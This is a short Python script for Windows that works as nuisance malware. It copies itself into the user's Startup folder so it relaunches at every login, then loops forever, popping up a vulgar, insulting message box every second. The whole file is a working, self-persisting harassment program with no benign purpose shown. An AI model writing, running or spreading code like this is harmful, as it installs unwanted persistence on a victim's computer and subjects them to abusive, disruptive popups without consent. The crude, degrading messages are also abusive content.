import win32api
import time
import os
import shutil

# Path to your script (can also use __file__ if this script is doing the moving)
script_path = os.path.abspath(__file__)  # path to the currently running .py file

# Get user's startup folder
startup_folder = os.path.join(
    os.environ["APPDATA"],
    r"Microsoft\Windows\Start Menu\Programs\Startup"
)

# Destination path
destination = os.path.join(startup_folder, os.path.basename(script_path))

# Copy to startup
if not os.path.exists(destination):
    shutil.copy(script_path, destination)

while True:
    win32api.MessageBox(0, "You have been assfucked!!", "Get fucked loser!")
    time.sleep(1)  # Optional: wait 1 second between popups to avoid overwhelming the system
